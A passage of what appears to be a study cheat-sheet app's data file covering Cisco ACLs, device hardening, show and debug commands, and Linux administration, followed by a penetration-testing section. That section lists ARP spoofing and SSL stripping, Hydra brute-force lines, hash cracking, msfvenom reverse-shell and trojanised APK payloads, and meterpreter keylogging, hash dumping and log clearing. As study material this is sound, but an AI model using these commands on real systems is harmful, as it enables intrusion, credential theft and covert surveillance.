Router(config-time-range)# periodic weekdays 8:00 to 17:00
Router(config)# access-list 101 permit tcp 192.168.1.0 0.0.0.255 any eq 80 time-range WORKING_HOURS""",
                    "verification": """Router# show access-lists
Router# show ip access-lists
Router# show ip interface gigabitethernet 0/0
Router# show time-range
Router# debug ip packet 100 detail
Router# clear access-list counters""",
                    "example": "Standard: Filter by source IP (near destination)\nExtended: Filter by src/dst IP, protocol, port (near source)",
                    "notes": ""
                },
                
                "05. IPv6 ACLs": {
                    "code": """! --- IPv6 ACLs ---
! IPv6 ACL
Router(config)# ipv6 access-list V6-ACL
Router(config-ipv6-acl)# permit tcp 2001:db8:1:1::/64 any eq www
Router(config-ipv6-acl)# permit tcp 2001:db8:1:1::/64 any eq 443
Router(config-ipv6-acl)# permit udp any any eq domain
Router(config-ipv6-acl)# deny tcp host 2001:db8:1:1::10 any eq telnet log-input
Router(config-ipv6-acl)# permit icmp any any echo-request
Router(config-ipv6-acl)# permit icmp any any echo-reply
Router(config-ipv6-acl)# permit icmp any any neighbor-solicitation
Router(config-ipv6-acl)# permit icmp any any neighbor-advertisement
Router(config-ipv6-acl)# permit icmp any any router-solicitation
Router(config-ipv6-acl)# permit icmp any any router-advertisement
Router(config-ipv6-acl)# deny ipv6 any any

! Apply to Interface
Router(config)# interface gigabitethernet 0/0
Router(config-if)# ipv6 traffic-filter V6-ACL in

! VTY IPv6 ACL
Router(config)# ipv6 access-list V6-VTY
Router(config-ipv6-acl)# permit tcp 2001:db8:1:1::/64 any eq 22
Router(config)# line vty 0 15
Router(config-line)# ipv6 access-class V6-VTY in

! IPv6 ACL Resequence
Router(config)# ipv6 access-list resequence V6-ACL 100 20""",
                    "verification": """Router# show ipv6 access-list
Router# show ipv6 interface gigabitethernet 0/0
Router# debug ipv6 packet
Router# show ipv6 neighbors""",
                    "example": "IPv6 ACLs use prefix length, not wildcard masks\nImplicit permit for ND (Neighbor Discovery) before implicit deny",
                    "notes": ""
                },
                
                "06. SSH & Device Hardening": {
                    "code": """! --- SSH & DEVICE HARDENING ---
! 1. Set Hostname & Domain
Router(config)# hostname R1
Router(config)# ip domain-name cisco.lab

! 2. Generate RSA Keys
Router(config)# crypto key generate rsa modulus 2048

! 3. SSH Version & Parameters
Router(config)# ip ssh version 2
Router(config)# ip ssh time-out 60
Router(config)# ip ssh authentication-retries 3

! 4. AAA Local Authentication
Router(config)# aaa new-model
Router(config)# aaa authentication login default local
Router(config)# username admin privilege 15 secret cisco123

! 5. VTY Lines
Router(config)# line vty 0 15
Router(config-line)# transport input ssh
Router(config-line)# login local
Router(config-line)# exec-timeout 10 0

! 6. Disable Unused Services
Router(config)# no ip http-server
Router(config)# no ip domain-lookup
Router(config)# no cdp run
Router(config)# no service dhcp

! 7. Password Encryption
Router(config)# service password-encryption
Router(config)# enable secret class

! 8. Login Banner
Router(config)# banner motd ^C Unauthorized Access Prohibited ^C

! 9. Login Blocking
Router(config)# login block-for 300 attempts 3 within 60""",
                    "verification": """Router# show ip ssh
Router# show ssh
Router# show crypto key mypubkey rsa
Router# show aaa sessions
Router# show users
Router# ssh -l admin 192.168.1.1

! SSH Troubleshooting
Router# show ip ssh | include version|timeout
Router# clear line vty [line-number]""",
                    "example": "SSHv2 with 2048-bit RSA keys\nUsername: admin\nPassword: cisco123\nLogin blocking: 3 failures in 60s = 300s quiet",
                    "notes": ""
                }
            },
            
            "✅ Verification": {
                "01. Show Commands Master List": {
                    "code": """! --- SHOW COMMANDS MASTER LIST ---
! SYSTEM & HARDWARE
show version
show running-config
show startup-config
show reload
show boot
show memory
show processes cpu
show environment
show inventory

! INTERFACES
show ip interface brief
show ipv6 interface brief
show interfaces
show interfaces description
show interfaces status
show interfaces trunk
show interfaces [int] switchport
show ip interface [int]

! IP ROUTING
show ip route
show ip route connected
show ip route static
show ip route rip
show ip route ospf
show ip route eigrp
show ipv6 route
show ip protocols

! RIPv2
show ip rip database
show ip route rip
debug ip rip
debug ip rip events

! OSPF
show ip ospf
show ip ospf neighbor
show ip ospf interface
show ip ospf database

! EIGRP
show ip eigrp neighbors
show ip eigrp topology

! VLAN & STP
show vlan brief
show interfaces trunk
show dtp
show vtp status
show etherchannel summary
show spanning-tree
show spanning-tree vlan [ID]

! SECURITY
show port-security
show port-security address
show mac address-table
show ip dhcp snooping
show ip dhcp snooping binding
show ip arp inspection
show ip arp inspection interfaces
show ip access-lists
show ipv6 access-lists
show ssh
show ip ssh

! NAT & DHCP
show ip nat translations
show ip nat statistics
show ip dhcp binding
show ip dhcp pool

! NTP & LOGGING
show ntp status
show ntp associations
show clock
show logging

! CDP & LLDP
show cdp neighbors
show cdp neighbors detail
show lldp neighbors
show lldp neighbors detail

! FILTERING (|)
| include [text]
| exclude [text]
| section [text]
| begin [text]""",
                    "verification": """! Common Filters:
show running-config | section interface
show running-config | include username
show ip route | include 0.0.0.0
show log | include %LINEPROTO
show interfaces | include line protocol
show version | include uptime
show ip route rip | include R
show ip ospf neighbor | include FULL""",
                    "example": "show ip interface brief | exclude unassigned\nshow running-config | begin interface Gi0/0",
                    "notes": ""
                },
                
                "02. Debug & Troubleshooting": {
                    "code": """! --- DEBUG & TROUBLESHOOTING ---
! DEBUG CONTROLS
undebug all
no debug all
debug ip rip
debug ip rip events
debug ip ospf events
debug ip ospf adj
debug ip eigrp
debug ip packet
debug ip nat
debug ip dhcp server events
debug spanning-tree events
debug etherchannel
debug cdp packets
debug lldp packets

! CONDITIONAL DEBUGGING
debug ip packet 100
access-list 100 permit icmp host 192.168.1.1 host 10.0.0.1

! PING & TRACEROUTE
ping [ip]
ping 2001:db8:1:1::1
traceroute [ip]

! CLEAR COMMANDS
clear ip route *
clear ip nat translation *
clear ip dhcp binding *
clear ip arp
clear mac address-table dynamic
clear logging
clear counters
clear ip ospf process
clear ip eigrp neighbors

! RELOAD
reload
reload in 10
reload at 23:30
reload cancel

! FILE MANAGEMENT
dir
copy running-config startup-config
copy running-config tftp:
delete flash:vlan.dat
erase startup-config
archive config""",
                    "verification": """show debugging
show reload
show flash:
dir nvram: | include config""",
                    "example": "debug ip rip (Shows RIP updates in real time)\ndebug ip packet 100 (Use with extreme caution in production!)",
                    "notes": ""
                }
            },
            
            "🐧 Linux Ops": {
                # ============ BASIC LINUX COMMANDS FROM EXCEL ============
                "01. Linux File System & Navigation": {
                    "code": """# ============ BASIC FILE SYSTEM NAVIGATION ============

# Display current directory
pwd

# List files and directories
ls                     # Basic list
ls -la                 # Detailed list with hidden files
ls /home/user          # List specific directory
ls -l /home/user | grep username  # Filter with grep

# Change directory
cd /path/to/dir        # Go to specific directory
cd ..                  # Go back one level
cd ~                   # Go to home directory

# Create directories
mkdir newdir           # Create single directory
mkdir -p path/to/nested  # Create nested directories

# Create files
touch file.txt         # Create empty file
touch /path/to/file.txt  # Create file in specific path

# View files
cat filename.txt       # Display entire file
head filename.txt      # First 10 lines
tail filename.txt      # Last 10 lines
less filename.txt      # View file page by page (Space=next, b=back, q=quit, /word=search)

# Copy files
cp source destination  # Copy file
cp -r dir1 dir2        # Copy directory recursively

# Move/Rename files
mv source destination  # Move or rename
sudo mv ~/file /destination/  # Move with sudo permissions

# Delete files
rm file.txt            # Delete file
rm -d folder           # Delete empty directory
rm -rf folder          # Force delete directory and contents

# File information
file filename          # Determine file type
stat filename          # Detailed file statistics
which command          # Show path of command

# Text editing (nano)
nano file.txt          # Open in nano editor
# Ctrl+O = Save, Ctrl+X = Exit, Ctrl+W = Search

# ============ FILE PERMISSIONS ============
chmod 755 file.sh      # rwxr-xr-x (owner=rwx, group=rx, others=rx)
chmod +x script.sh     # Add execute permission
chmod -w file.txt      # Remove write permission
chown user:group file  # Change owner and group
sudo chown root:root file  # Change to root owner

# Permission explanation:
# r = read (4), w = write (2), x = execute (1)
# chmod 755 = owner(7=rwx), group(5=r-x), others(5=r-x)

# ============ FIND COMMANDS ============
find / -name "file.txt" 2>/dev/null  # Search from root, hide errors
find . -name "*.txt"     # Search in current directory for .txt files
find /home -user username  # Find files owned by specific user
find /var -size +10M     # Find files larger than 10MB

# ============ GREP COMMANDS ============
grep "text" file.txt     # Search for text in file
grep -i "text" file.txt  # Case-insensitive search
grep -r "text" /dir/     # Recursive search in directory
grep -C 2 "pattern" file  # Show 2 lines before and after match
grep -v "exclude" file   # Show lines NOT matching pattern

# ============ ECHO & PRINT ============
echo "Hello World"       # Print text
echo $PATH               # Print environment variable
echo "Text" > file.txt   # Write to file (overwrite)
echo "Text" >> file.txt  # Append to file

# ============ SYMLINKS ============
ln -s /original/file /link  # Create symbolic link (shortcut)
ln -s /usr/share/seclists ~/seclists  # Example from Excel

# ============ FILE COMBINING ============
cat file1.jpg file2.zip > output.jpg  # Hide zip inside image

# ============ SYSTEM INFO ============
whoami                  # Show current username
id                      # Show user ID, group ID
uname -a                # System information
hostname                # Show hostname
uptime                  # System uptime
date                    # Current date/time
cal                     # Calendar
df -h                   # Disk space usage
du -sh /path            # Directory size
free -h                 # Memory usage
top                     # Process viewer
htop                    # Enhanced process viewer (sudo apt install htop)

# ============ PROCESS MANAGEMENT ============
ps aux                  # Show all processes
ps aux | grep firefox   # Find specific process
kill PID                # Kill process by ID
kill -9 PID             # Force kill
pkill process_name      # Kill by name
jobs                    # Show background jobs
bg                      # Send to background
fg                      # Bring to foreground

# ============ NETWORK COMMANDS ============
ip addr show            # Show IP addresses
ip route show           # Show routing table
ip link show            # Show network interfaces
ss -tulpn               # Show listening ports
netstat -tulnp          # Alternative to ss
ping -c 4 google.com    # Ping with count
traceroute google.com   # Trace route
curl ifconfig.me        # Show public IP
wget -O file URL        # Download file
hostname -I             # Show local IPs

# ============ PACKAGE MANAGEMENT ============
sudo apt update         # Update package list
sudo apt upgrade        # Upgrade all packages
sudo apt upgrade -y     # Upgrade without confirmation
sudo apt install package  # Install package
sudo apt remove package # Remove package
sudo apt autoremove     # Remove unused packages
sudo apt clean          # Clean cache
dpkg -i package.deb     # Install .deb file
dpkg -l                 # List installed packages

# ============ SERVICE MANAGEMENT ============
systemctl start service   # Start service
systemctl stop service    # Stop service
systemctl restart service # Restart service
systemctl status service  # Check service status
systemctl enable service  # Enable at boot
systemctl disable service # Disable at boot

# ============ SSH & REMOTE ACCESS ============
ssh user@host           # Connect via SSH
ssh-keygen -t rsa       # Generate SSH key
ssh-copy-id user@host   # Copy SSH key to remote
scp file user@host:/path  # Copy file via SSH
rsync -av src/ dst/     # Sync directories

# ============ ARCHIVE & COMPRESSION ============
tar -czvf archive.tar.gz dir/  # Create tar.gz
tar -xzvf archive.tar.gz       # Extract tar.gz
zip -r archive.zip dir/        # Create zip
unzip archive.zip              # Extract zip
unzip archive.zip -d /path/    # Extract to specific path
gzip -d file.gz                # Decompress gzip

# ============ SHELL SHORTCUTS ============
# Ctrl+A = Beginning of line
# Ctrl+E = End of line
# Ctrl+U = Cut to beginning
# Ctrl+K = Cut to end
# Ctrl+Y = Paste
# Ctrl+L = Clear screen
# Ctrl+C = Interrupt
# Ctrl+D = Exit
# !! = Repeat last command
# history = Command history
# Ctrl+R = Search history

# ============ CLEAR SCREEN ============
clear                    # Clear terminal
history -c               # Clear command history""",
                    "verification": """# Verification commands
ls -la
pwd
which python
file /bin/ls
stat /etc/passwd
id
whoami
df -h
free -h""",
                    "example": "Example: ls -la /home | grep user\nExample: find / -name '*.conf' 2>/dev/null\nExample: grep -r 'error' /var/log/",
                    "notes": "📌 ملاحظات مهمة:\n• استخدم man command لعرض دليل الأمر\n• استخدم command --help للحصول على مساعدة سريعة\n• sudo ينفذ الأمر بصلاحيات المدير\n• | (pipe) يمرر ناتج أمر كمدخل للأمر التالي"
                },
                
                "02. System Monitoring & Performance": {
                    "code": """# ============ SYSTEM MONITORING ============

# CPU & Memory
top                      # Real-time process viewer
htop                     # Enhanced top (sudo apt install htop)
atop                     # Advanced system monitor
free -h                  # Memory usage
vmstat 1                 # Virtual memory stats every second
mpstat -P ALL 1          # Per-CPU statistics
lscpu                    # CPU information

# Disk Usage
df -h                    # Disk space usage
df -i                    # Inode usage
du -sh *                 # Directory sizes in current dir
du -sh /home/* | sort -h # Sort by size
ncdu                     # Interactive disk usage (sudo apt install ncdu)

# Process Management
ps aux                   # All processes
ps aux | grep process    # Find specific process
pstree                   # Process tree
kill PID                 # Kill process
kill -9 PID              # Force kill
pkill process_name       # Kill by name
renice -n 10 -p PID      # Change priority

# System Logs
journalctl               # View system logs
journalctl -xe           # Recent errors with explanation
journalctl -u service    # Logs for specific service
journalctl -f            # Follow new logs
dmesg                    # Kernel messages
dmesg | tail -20         # Last 20 kernel messages
tail -f /var/log/syslog  # Follow system log

# Network Monitoring
ss -tulpn                # All listening ports
netstat -tulpn           # Alternative to ss
lsof -i :80              # Processes using port 80
iftop                    # Network traffic (sudo apt install iftop)
nethogs                  # Per-process network traffic
bmon                     # Bandwidth monitor
iptraf-ng                # IP traffic monitor

# Hardware Information
lscpu                    # CPU info
lsblk                    # Block devices (disks)
lspci                    # PCI devices
lsusb                    # USB devices
dmidecode                # DMI/SMBIOS info (hardware)

# ============ PERFORMANCE BENCHMARKING ============
time command             # Time command execution
dd if=/dev/zero of=test bs=1M count=1000  # Write speed test
dd if=test of=/dev/null bs=1M             # Read speed test
hdparm -tT /dev/sda      # Disk speed test
iperf3 -s                # Start iperf server
iperf3 -c server_ip      # Network speed test

# ============ SYSTEM INFORMATION ============
uname -a                 # Kernel info
hostnamectl              # System info
lsb_release -a           # Distribution info
cat /etc/os-release      # OS release info
uptime                   # System uptime
who -b                   # Last boot time
last reboot              # Reboot history

# ============ ADVANCED MONITORING TOOLS ============
# Glances (install: sudo apt install glances)
glances                  # Comprehensive monitoring
glances -w               # Web interface mode (port 61208)

# Netdata (install: bash <(curl -Ss https://my-netdata.io/kickstart.sh))
# Then open http://localhost:19999

# Prometheus + Grafana (via Docker)
# docker-compose.yml example included in advanced section

# ============ ALERT SCRIPTS ============
# Disk usage alert
#!/bin/bash
USAGE=$(df -h / | awk 'NR==2 {print $5}' | sed 's/%//')
if [ $USAGE -gt 90 ]; then
    echo "Disk usage is $USAGE%" | mail -s "Disk Alert" admin@example.com
fi

# CPU load alert
#!/bin/bash
LOAD=$(uptime | awk -F'load average:' '{print $2}' | cut -d, -f1)
if (( $(echo "$LOAD > 5" | bc -l) )); then
    echo "High load: $LOAD" | logger -t loadalert
fi

# ============ SYSTEMD SERVICE MANAGEMENT ============
systemctl list-units --type=service          # List all services
systemctl list-units --type=service --state=running  # Running services
systemctl status service                      # Service status
systemctl start service                       # Start service
systemctl stop service                        # Stop service
systemctl restart service                     # Restart service
systemctl enable service                      # Enable at boot
systemctl disable service                     # Disable at boot
systemctl reload service                      # Reload config without restart

# ============ CRONTAB (Task Scheduling) ============
crontab -e                # Edit crontab
crontab -l                # List cron jobs

# Crontab format:
# * * * * * command
# | | | | |
# | | | | +---- Day of week (0-7, 0/7=Sunday)
# | | | +------ Month (1-12)
# | | +-------- Day of month (1-31)
# | +---------- Hour (0-23)
# +------------ Minute (0-59)

# Examples:
# */5 * * * * /home/user/check.sh    # Every 5 minutes
# 0 * * * * /home/user/hourly.sh      # Every hour
# 0 2 * * * /home/user/daily.sh       # Every day at 2am
# 0 0 * * 0 /home/user/weekly.sh      # Every Sunday at midnight

# ============ ALIASES FOR MONITORING ============
# Add to ~/.bashrc:
alias top10='ps aux | sort -nrk 3,3 | head -10'  # Top 10 CPU
alias mem10='ps aux | sort -nrk 4,4 | head -10'  # Top 10 memory
alias ports='ss -tulpn | grep LISTEN'
alias myip='curl ifconfig.me'
alias size='du -sh * | sort -h'
alias df='df -h'
alias free='free -h'""",
                    "verification": """# Quick system check
uptime
free -h
df -h
top -bn1 | head -15
ps aux | wc -l
ss -tulpn | grep LISTEN
systemctl list-units --type=service --state=running | wc -l""",
                    "example": "Example: htop (interactive process viewer)\nExample: ncdu (disk usage analyzer)\nExample: journalctl -xe (view recent errors)",
                    "notes": "💡 نصائح للمراقبة:\n• استخدم htop بدلاً من top لواجهة أفضل\n• Glances أداة شاملة للمبتدئين\n• راقب المتوسطات وليس القمم اللحظية فقط\n• ضع تنبيهات للموارد الحرجة (CPU > 90%, Disk > 90%)"
                },
                
                "03. Network Security & Scanning Tools": {
                    "code": """# ============ NETWORK SCANNING TOOLS ============

# ===== NMAP (Network Mapper) =====
# Installation
sudo apt install nmap -y

# Basic scans
nmap target_ip                    # Basic scan
nmap -sP 192.168.1.0/24           # Ping sweep (discover live hosts)
nmap -sL 192.168.1.0/24           # List scan (no packets)
nmap -sS target_ip                 # SYN stealth scan
nmap -sT target_ip                 # TCP connect scan
nmap -sU target_ip                 # UDP scan
nmap -sV target_ip                 # Version detection
nmap -O target_ip                  # OS detection
nmap -A target_ip                  # Aggressive scan (OS, version, scripts, traceroute)

# Port scanning
nmap -p 80 target_ip               # Scan specific port
nmap -p 1-1000 target_ip           # Scan port range
nmap -p- target_ip                 # Scan all ports (1-65535)
nmap --top-ports 100 target_ip     # Scan top 100 ports

# Script scanning
nmap -sC target_ip                 # Default scripts
nmap --script vuln target_ip       # Vulnerability scripts
nmap --script smb-vuln* target_ip  # SMB vulnerability scripts

# Output formats
nmap -oN scan.txt target_ip        # Normal output
nmap -oX scan.xml target_ip        # XML output
nmap -oG scan.gnmap target_ip      # Grepable output

# Advanced examples
sudo nmap -sn 192.168.1.0/24       # Ping sweep
nmap -sC -sV 10.10.135.44          # Script + version scan (from Excel)

# ===== ARP SCANNING =====
# arp-scan
sudo apt install arp-scan -y
sudo arp-scan -l                   # Scan local network
sudo arp-scan --localnet           # Alternative syntax

# arping
sudo apt install iputils-arping -y
sudo arping -I eth0 -c 5 192.168.1.40  # Send ARP requests

# netdiscover
sudo apt install netdiscover -y
sudo netdiscover                   # Passive/active ARP scanner
sudo netdiscover -r 192.168.1.0/24 # Scan specific range

# ===== NETWORK INFORMATION =====
ip a                               # Show IP addresses
ip route                           # Show routing table
ip route | grep default            # Show default gateway
route -n                           # Show routing table (numeric)
arp -n                             # Show ARP table
ip neigh show                      # Show neighbor table

# ===== PACKET CAPTURE & ANALYSIS =====
# tcpdump
sudo tcpdump -i eth0               # Capture on interface
sudo tcpdump -i eth0 -n            # Capture, no DNS resolution
sudo tcpdump -i eth0 arp           # Capture ARP packets
sudo tcpdump -i eth0 host 192.168.1.40  # Capture specific host
sudo tcpdump -i eth0 port 80       # Capture HTTP traffic
sudo tcpdump -w capture.pcap       # Write to file
sudo tcpdump -r capture.pcap       # Read from file

# wireshark (GUI)
sudo apt install wireshark -y
sudo wireshark                     # Launch GUI

# ===== ARP SPOOFING / MITM =====
# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo sysctl -w net.ipv4.ip_forward=1

# arpspoof (from dsniff package)
sudo apt install dsniff -y
sudo arpspoof -i eth0 -t 192.168.1.40 192.168.1.1  # Spoof target
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.40  # Spoof router

# iptables for forwarding
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i eth0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o eth0 -j ACCEPT

# ettercap (MITM tool)
sudo apt install ettercap-graphical -y
sudo ettercap -T -q -M arp:remote -i eth0 ///  # Text mode ARP poisoning
ettercap                                       # GUI mode

# sslstrip (HTTPS downgrade)
sudo apt install sslstrip -y
sslstrip -a                                    # Run SSL stripping

# ===== WEB APPLICATION SCANNING =====
# Directory/File discovery
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt
gobuster dns -d example.com -w /usr/share/wordlists/dns/subdomains.txt

ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://10.10.114.9/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

dirsearch -u http://192.168.204.131/            # Directory search

# DirBuster (Java GUI)
java -jar /usr/share/dirbuster/DirBuster.jar

# Wordlists location
ls /usr/share/wordlists/
ls /usr/share/seclists/                         # SecLists (install: sudo apt install seclists)
/usr/share/wordlists/rockyou.txt.gz             # Common passwords (extract: gzip -d)

# ===== BRUTE FORCE TOOLS =====
# Hydra (network services)
sudo apt install hydra -y

# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 -t 4
hydra -L users.txt -P passwords.txt ssh://10.0.0.5

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://192.168.1.50

# HTTP POST form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.204.131 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"

# SMB brute force
hydra -L users.txt -P pass.txt smb://192.168.1.30

# Medusa (alternative to Hydra)
sudo apt install medusa -y

# ===== PASSWORD CRACKING =====
# John the Ripper
sudo apt install john -y

# Basic usage
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt

# Extract hashes from archives
zip2john archive.zip > zip_hash.txt
rar2john archive.rar > rar_hash.txt
7z2john archive.7z > 7z_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt

# fcrackzip (fast ZIP cracking)
sudo apt install fcrackzip -y
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u archive.zip
fcrackzip -b -c a -l 1-6 -u archive.zip  # Brute force 1-6 letters

# ===== HASH CAT (GPU cracking) =====
sudo apt install hashcat -y

# Hash modes:
# 0 = MD5, 100 = SHA1, 1000 = NTLM, 1400 = SHA256, 3200 = bcrypt

# Dictionary attack
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Dictionary with rules
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force / mask attack
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a  # 6 characters, all types
hashcat -m 100 hashes.txt -a 3 'youssef?l?l?l?l'  # Custom mask

# Show cracked hashes
hashcat --show -m 0 hash.txt

# ===== HASH GENERATION =====
# OpenSSL hash generation
echo -n "password" | openssl dgst -md5
echo -n "password" | openssl dgst -sha1
echo -n "password" | openssl dgst -sha256
echo -n "password" | openssl dgst -sha512

# mkpasswd (SHA-512 for Linux passwords)
sudo apt install whois -y
mkpasswd -m sha-512                      # Interactive
mkpasswd -m sha-512 "password"           # Generate hash

# htpasswd (bcrypt for web servers)
sudo apt install apache2-utils -y
htpasswd -nbB admin 123456                # Generate bcrypt hash

# Name-That-Hash (hash identification)
pip install name-that-hash
nth --text '5f4dcc3b5aa765d61d8327deb882cf99'  # Identify hash type
nth --file hashes.txt

# ===== HASH IDENTIFICATION WEBSITES =====
# https://hashes.com/en/tools/hash_identifier
# https://www.tunnelsup.com/hash-analyzer/

# ===== FTP CLIENT COMMANDS =====
# Connect to FTP server
ftp -a 10.10.135.44                     # Anonymous login
ftp 192.168.1.100

# FTP commands (once connected)
ls                                      # List files
get file.txt                            # Download file
put file.txt                            # Upload file
mget *.txt                              # Download multiple
mput *.txt                              # Upload multiple
cd /path                                # Change directory
pwd                                     # Show remote directory
binary                                  # Binary mode
ascii                                   # ASCII mode
quit                                    # Exit

# ===== SQLITE DATABASE =====
sqlite3 database.db                      # Open SQLite database
.tables                                  # Show tables
.schema table_name                       # Show table schema
PRAGMA table_info(table_name);            # Show table structure
SELECT * FROM table_name;                 # Query data
.quit                                    # Exit

# ===== METASPLOIT FRAMEWORK =====
sudo apt install metasploit-framework -y

# Basic commands
msfconsole                               # Start Metasploit
msfvenom                                 # Payload generator

# msfvenom examples
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f raw > shell.php
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o backdoor.apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.113 LPORT=4444 -x AdobeReader.apk -o AdobeReadr.apk

# msfvenom options
msfvenom --list payloads                  # List payloads
msfvenom --list encoders                  # List encoders
msfvenom --list formats                    # List output formats

# ===== METASPLOIT HANDLER =====
# msfconsole commands
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit

# Meterpreter commands (after session)
sysinfo                                    # System information
getuid                                     # Current user
getpid                                     # Process ID
ps                                         # List processes
migrate PID                                # Migrate to process
shell                                      # Open system shell
download file.txt                          # Download file
upload file.exe                            # Upload file
screenshot                                 # Take screenshot
webcam_snap                                # Take webcam photo
keyscan_start                              # Start keylogging
keyscan_dump                                # Dump keylog
hashdump                                   # Dump password hashes
clearev                                    # Clear event logs
background                                 # Background session
sessions -l                                # List sessions
sessions -i 1                              # Interact with session

# ===== PORT FORWARDING =====
# Check port usage
sudo lsof -i :4444
sudo ss -tulnp | grep 4444
sudo netstat -tulnp | grep 4444

# Kill process using port
sudo kill -9 PID
sudo fuser -k 4444/tcp

# iptables port forwarding
sudo iptables -t nat -A PREROUTING -p tcp --dport 4444 -j REDIRECT --to-port 4482

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# ===== BURP SUITE & WEB PROXIES =====
burpsuite                                   # Launch Burp Suite
zaproxy                                     # Launch OWASP ZAP
# Configure browser proxy: 127.0.0.1:8080

# ===== EVIL LIMITER (Network Control) =====
git clone https://github.com/bitbrute/evillimiter.git
cd evillimiter
sudo python3 setup.py install
sudo evillimiter

# evillimiter commands (inside tool)
scan                                       # Scan network
hosts                                      # Show hosts
limit 1 100kbit                            # Limit host 1 to 100kbps
block 1                                    # Block host 1
free 1                                     # Free host 1

# ===== OPENVPN =====
sudo apt install openvpn -y
sudo openvpn file.ovpn                      # Connect with config file

# ===== DOCKER =====
sudo apt install docker.io -y
sudo systemctl start docker
sudo systemctl enable docker
docker --version

# ===== NESSUS VULNERABILITY SCANNER =====
# Download from https://www.tenable.com/downloads/nessus
sudo dpkg -i Nessus-*.deb
sudo systemctl start nessusd
sudo systemctl status nessusd
# Access: https://localhost:8834

# ===== GREENBONE (OpenVAS) =====
sudo apt update
sudo apt install gvm -y
sudo gvm-setup                               # Initial setup
sudo gvm-start                                # Start services
sudo gvm-stop                                 # Stop services
# Access: https://127.0.0.1:9392

# ===== ARP-SCAN =====
sudo arp-scan -l                              # Scan local network""",
                    "verification": """# Verify installations
nmap --version
hydra --version
john --version
hashcat --version
msfconsole --version
arp-scan --version
tcpdump --version""",
                    "example": "nmap -sC -sV 10.10.135.44\nhydra -l admin -P rockyou.txt ssh://192.168.1.100\nhashcat -m 0 -a 0 hash.txt rockyou.txt",
                    "notes": "⚠️ تنبيهات مهمة:\n• استخدم هذه الأدوات فقط على أجهزتك أو بإذن كتابي\n• بعض الأدوات قد تكون غير قانونية إذا استخدمت بشكل خاطئ\n• تأكد من تحديث قواعد البيانات: sudo apt update\n• للتدريب، استخدم بيئات معزولة مثل VirtualBox"
                },
                
                "04. Web Application Security Tools": {
                    "code": """# ============ WEB APPLICATION SECURITY TOOLS ============

# ===== BURP SUITE =====
# Launch Burp Suite (Community Edition)
burpsuite

# Configure Firefox proxy:
# HTTP Proxy: 127.0.0.1
# Port: 8080
# Also use this proxy for HTTPS

# Burp Suite features:
# - Proxy: Intercept and modify requests
# - Repeater: Manually modify and replay requests
# - Intruder: Automated customized attacks
# - Scanner: Automated vulnerability scanning (Pro only)
# - Sequencer: Analyze session tokens
# - Decoder: Decode/encode data
# - Comparer: Compare responses

# ===== OWASP ZAP =====
# Installation
sudo apt update
sudo apt install zaproxy -y

# Launch ZAP
zaproxy

# Configure proxy (same as Burp: 127.0.0.1:8080)

# Quick Start Scan
# - Open Quick Start tab
# - Enter URL to scan
# - Click Attack button
# - Results appear in Alerts tab

# ZAP features:
# - Automated scanner
# - Passive scanner
# - Forced browse (directory discovery)
# - Fuzzer
# - WebSocket support
# - API for automation

# ===== DIRECTORY/DISCOVERY TOOLS =====
# FFUF (Fuzz Faster U Fool)
sudo apt install ffuf -y

# Basic directory fuzzing
ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://10.10.114.9/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# With file extensions
ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt

# Recursive scanning
ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -recursion -recursion-depth 2

# Virtual host discovery
ffuf -u http://example.com -H "Host: FUZZ.example.com" -w /usr/share/wordlists/dns/subdomains.txt

# Filter results
ffuf -u http://example.com/FUZZ -w wordlist.txt -fc 403,404  # Filter status codes
ffuf -u http://example.com/FUZZ -w wordlist.txt -fs 0        # Filter response size

# ===== GOBUSTER =====
sudo apt install gobuster -y

# Directory scanning
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# DNS subdomain scanning
gobuster dns -d example.com -w /usr/share/wordlists/dns/subdomains.txt

# VHost scanning
gobuster vhost -u http://example.com -w /usr/share/wordlists/vhosts.txt

# ===== DIRB =====
sudo apt install dirb -y

dirb http://example.com
dirb http://example.com /usr/share/wordlists/dirb/common.txt
dirb http://example.com -X .php,.html  # Add extensions

# ===== DIRSEARCH =====
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
python3 dirsearch.py -u http://192.168.204.131/
